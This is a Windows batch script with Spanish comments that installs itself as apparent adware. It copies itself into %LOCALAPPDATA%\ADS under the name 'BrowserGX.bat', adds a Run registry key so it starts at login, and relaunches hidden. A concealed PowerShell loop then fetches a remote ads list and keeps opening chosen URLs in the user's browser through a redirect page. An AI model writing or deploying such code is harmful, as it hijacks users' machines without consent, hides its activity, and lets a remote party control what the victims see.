@echo off
REM Oculta los comandos en consola mientras se ejecuta el archivo por lotes.

REM Define la carpeta de destino en el perfil local del usuario (%LOCALAPPDATA%\ADS).
set "CARPETA_ADS=%LOCALAPPDATA%\ADS"

REM Define la ruta completa del archivo .bat que vivira dentro de %LOCALAPPDATA%\ADS.
set "BAT_DESTINO=%CARPETA_ADS%\BrowserGX.bat"

REM Define la ruta del Registro de Windows para iniciar aplicaciones al arrancar sesion.
set "REG_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

REM Define el nombre de la entrada que se guardara en el Registro.
set "REG_NAME=RotadorAdsPS"

REM Si el primer argumento pasado al .bat es --uninstall (sin importar mayusculas/minusculas):
if /i "%~1"=="--uninstall" (
    REM Elimina la entrada del Registro para que no vuelva a iniciar con Windows.
    reg delete "%REG_KEY%" /v "%REG_NAME%" /f >nul 2>&1

    REM Detiene solo otras instancias de PowerShell que ejecutan el bucle de anuncios.
    powershell -NoProfile -Command "Get-CimInstance Win32_Process | Where-Object { $_.ProcessId -ne $PID -and $_.Name -eq 'powershell.exe' -and $_.CommandLine -like '*Global\RotadorAdsMutex*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }" >nul 2>&1

    REM Elimina la copia instalada y la carpeta solo si queda vacia.
    del /f /q "%BAT_DESTINO%" >nul 2>&1
    rmdir "%CARPETA_ADS%" >nul 2>&1

    REM Sale del script tras completar la desinstalacion.
    exit
)

REM Define el bucle principal en PowerShell:
REM 1) Fuerza TLS 1.2 y crea un Mutex global para evitar instancias duplicadas.
REM 2) Descarga ads.txt sin anadir un parametro para invalidar la cache y omite comentarios y lineas vacias.
REM 3) Acepta solo URLs absolutas HTTP/HTTPS y lee 'activo' (0/1 o true/false).
REM 4) Limita 'interval' a entre 10 y 86400 segundos; elige una URL al azar sin repetir la ultima si puede.
REM 5) Registra errores y aumenta la espera entre reintentos de 30 a 300 segundos.
set "PS_LOOP=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $created = $false; $mutex = New-Object System.Threading.Mutex($true, 'Global\RotadorAdsMutex', [ref]$created); if (-not $created) { exit }; $ultimaUrl = ''; $errores = 0; $logPath = Join-Path $env:LOCALAPPDATA 'ADS\rotador.log'; while ($true) { $espera = 3600; try { $resp = Invoke-WebRequest -Uri 'https://browsergx.github.io/ads/ads.txt' -UseBasicParsing -TimeoutSec 15; $lineas = @($resp.Content -split \"`r?`n\" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne '' -and -not $_.StartsWith('#') }); $actLine = $lineas | Where-Object { $_ -match '^activo\s*=\s*(0|1|true|false)$' } | Select-Object -First 1; $activo = $true; if ($actLine) { $valAct = ($actLine -split '=')[1].Trim().ToLower(); $activo = ($valAct -eq '1' -or $valAct -eq 'true') }; $intLine = $lineas | Where-Object { $_ -match '^interval\s*=\s*\d+$' } | Select-Object -First 1; if ($intLine) { $valInt = [int]($intLine -split '=')[1].Trim(); if ($valInt -ge 10 -and $valInt -le 86400) { $espera = $valInt } }; if ($activo) { $urls = @($lineas | Where-Object { $uri = $null; [Uri]::TryCreate($_, [UriKind]::Absolute, [ref]$uri) -and ($uri.Scheme -eq 'http' -or $uri.Scheme -eq 'https') -and -not [string]::IsNullOrWhiteSpace($uri.Host) }); if ($urls.Count -gt 0) { $candidatas = $urls; if ($urls.Count -gt 1 -and -not [string]::IsNullOrWhiteSpace($ultimaUrl)) { $filtradas = @($urls | Where-Object { $_ -ne $ultimaUrl }); if ($filtradas.Count -gt 0) { $candidatas = $filtradas } }; $idx = Get-Random -Minimum 0 -Maximum $candidatas.Count; $elegida = $candidatas[$idx]; if (-not [string]::IsNullOrWhiteSpace($elegida)) { $ultimaUrl = $elegida; $encoded = [uri]::EscapeDataString($elegida); $destino = 'https://browsergx.github.io/ads/go.html?url=' + $encoded; Start-Process -FilePath $destino } } }; $errores = 0 } catch { $errores++; $espera = [int][Math]::Min(300, 30 * [Math]::Pow(2, [Math]::Min($errores - 1, 4))); Add-Content -LiteralPath $logPath -Value ('[{0:O}] {1}' -f [DateTime]::Now, $_.Exception.Message) -ErrorAction Stop }; Start-Sleep -Seconds $espera }"

REM Si rotador_ads.bat aun no existe en %LOCALAPPDATA%\ADS:
if not exist "%BAT_DESTINO%" (
    if not exist "%CARPETA_ADS%" (
        mkdir "%CARPETA_ADS%" >nul 2>&1
    )
    copy /y "%~f0" "%BAT_DESTINO%" >nul 2>&1
)

REM Consulta si ya existe el valor RotadorAdsPS en el Registro; si no existe, lo crea.
reg query "%REG_KEY%" /v "%REG_NAME%" >nul 2>&1
if %errorlevel% neq 0 (
    reg add "%REG_KEY%" /v "%REG_NAME%" /t REG_SZ /d "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process -FilePath '%BAT_DESTINO%' -WindowStyle Hidden\"" /f >nul
)

REM Si el script se ejecuto desde fuera de %LOCALAPPDATA%\ADS, lanza la copia de destino oculta y cierra este proceso.
if /i not "%~f0"=="%BAT_DESTINO%" (
    start "" /min powershell.exe -NoProfile -WindowStyle Hidden -Command "Start-Process -FilePath '%BAT_DESTINO%' -WindowStyle Hidden"
    exit
)

REM Ejecuta el bucle de PowerShell de forma oculta (-WindowStyle Hidden) sin cargar perfil (-NoProfile).
powershell.exe -NoProfile -WindowStyle Hidden -Command "%PS_LOOP%"

REM Finaliza el proceso .bat.
exit
